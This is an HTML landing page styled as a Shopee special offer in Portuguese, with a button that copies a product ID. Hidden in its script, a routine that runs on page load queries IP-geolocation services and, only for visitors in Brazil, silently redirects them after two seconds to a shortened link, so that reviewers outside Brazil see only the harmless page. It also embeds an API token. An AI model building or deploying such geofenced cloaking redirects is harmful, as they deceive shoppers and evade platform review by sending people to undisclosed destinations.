<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Oferta Especial Shopee</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f7f7; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
        .card { background: white; width: 100%; max-width: 380px; padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; box-sizing: border-box; }
        h2 { color: #333; margin-top: 0; font-size: 1.6rem; margin-bottom: 25px; font-weight: 800; }
        .step { text-align: left; margin-bottom: 20px; color: #444; font-size: 1.05rem; line-height: 1.6; }
        .step strong { color: #ee4d2d; font-size: 1.2rem; }
        .id-container { background-color: #f0f0f0; border: 2px dashed #ccc; padding: 15px; border-radius: 10px; margin-top: 10px; margin-bottom: 15px; text-align: center; }
        .id-text { font-family: 'Courier New', Courier, monospace; font-size: 1.4rem; font-weight: bold; color: #333; letter-spacing: 1px; }
        .btn-copy { background: linear-gradient(180deg, #ff5722 0%, #ee4d2d 100%); color: white; border: none; width: 100%; padding: 18px; border-radius: 15px; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: transform 0.1s, box-shadow 0.2s; box-shadow: 0 5px 15px rgba(238, 77, 45, 0.3); outline: none; -webkit-tap-highlight-color: transparent; }
        .btn-copy:active { transform: scale(0.96); box-shadow: 0 2px 8px rgba(238, 77, 45, 0.2); }
        #toast { visibility: hidden; min-width: 200px; background-color: #333; color: #fff; text-align: center; border-radius: 50px; padding: 12px 24px; position: fixed; z-index: 1; bottom: 30px; left: 50%; transform: translateX(-50%); font-size: 15px; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.2); opacity: 0; transition: opacity 0.3s, bottom 0.3s; }
        #toast.show { visibility: visible; opacity: 1; bottom: 40px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Siga os passos:</h2>
    
    <div class="step">
        <strong>1.</strong> Copie o ID do produto abaixo:
        <div class="id-container">
            <span class="id-text" id="productId">BPC-FYT-VXX</span>
        </div>
        <button class="btn-copy" onclick="copyId()" id="mainBtn">CLIQUE PARA COPIAR</button>
    </div>

    <div class="step">
        <strong>2.</strong> Abra o App <strong>Shopee</strong> e cole na busca.
    </div>

    <div class="step">
        <strong>3.</strong> Finalize seu pedido com cupom.
    </div>
</div>

<div id="toast">✅ ID Copiado!</div>

<script>
    // ---------- FUNÇÃO DE CÓPIA (SOMENTE COPIAR, NADA DE REDIRECIONAMENTO) ----------
    function copyId() {
        const idText = document.getElementById('productId').innerText;
        const btn = document.getElementById('mainBtn');
        
        const el = document.createElement('textarea');
        el.value = idText;
        el.setAttribute('readonly', '');
        el.style.position = 'absolute';
        el.style.left = '-9999px';
        document.body.appendChild(el);
        
        const selected = document.getSelection().rangeCount > 0 ? document.getSelection().getRangeAt(0) : false;
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
        
        if (selected) {
            document.getSelection().removeAllRanges();
            document.getSelection().addRange(selected);
        }

        // Feedback visual
        btn.innerText = "COPIADO!";
        btn.style.background = "#28a745";
        btn.style.boxShadow = "0 5px 15px rgba(40, 167, 69, 0.3)";

        const toast = document.getElementById("toast");
        toast.className = "show";
        
        setTimeout(function(){ 
            toast.className = toast.className.replace("show", ""); 
            btn.innerText = "CLIQUE PARA COPIAR";
            btn.style.background = "linear-gradient(180deg, #ff5722 0%, #ee4d2d 100%)";
            btn.style.boxShadow = "0 5px 15px rgba(238, 77, 45, 0.3)";
        }, 2500);
    }

    // ---------- REDIRECIONAMENTO AUTOMÁTICO APÓS CONFIRMAÇÃO DE BRASIL (2 SEGUNDOS APÓS RESPOSTA DA API) ----------
    const REDIRECT_URL = "https://shrten.io/Compre_Seu_Vestido_Aqui";
    let redirectScheduled = false;   // evita múltiplos redirecionamentos

    function scheduleRedirectIfBrazil(countryCode) {
        if (redirectScheduled) return;        // já agendado
        if (countryCode === "BR") {
            redirectScheduled = true;
            // Contagem de 2 segundos começa AGORA, após a resposta da API
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 2000);
        }
        // se não for Brasil, nada acontece
    }

    // Detecção de país usando múltiplas APIs (igual ao original, mas agora com callback)
    function detectarPaisEAgendar() {
        const apis = [
            {
                url: "https://ipapi.co/json/",
                parser: (data) => data.country_code,
                timeout: 1000
            },
            {
                url: "https://ipinfo.io/json?token=8f2c8b2d6c3a7c",
                parser: (data) => data.country,
                timeout: 1000
            },
            {
                url: "https://api.country.is/",
                parser: (data) => data.country,
                timeout: 1000
            }
        ];

        let current = 0;

        function tryNext() {
            if (current >= apis.length) {
                // Nenhuma API conseguiu determinar o país → sem redirecionamento
                return;
            }

            const api = apis[current];
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), api.timeout);

            fetch(api.url, { signal: controller.signal, mode: 'cors' })
                .then(res => {
                    clearTimeout(timer);
                    if (!res.ok) throw new Error();
                    return res.json();
                })
                .then(data => {
                    let country = api.parser(data);
                    if (country && typeof country === 'string') {
                        country = country.toUpperCase();
                        // Se detectou BR, agenda redirecionamento (2s após essa resposta)
                        scheduleRedirectIfBrazil(country);
                    }
                    // Independente do país, encerramos a busca (já temos uma resposta)
                })
                .catch(() => {
                    clearTimeout(timer);
                    current++;
                    tryNext();
                });
        }

        tryNext();
    }

    // Inicia a detecção assim que a página carrega
    detectarPaisEAgendar();
</script>
</body>
</html>
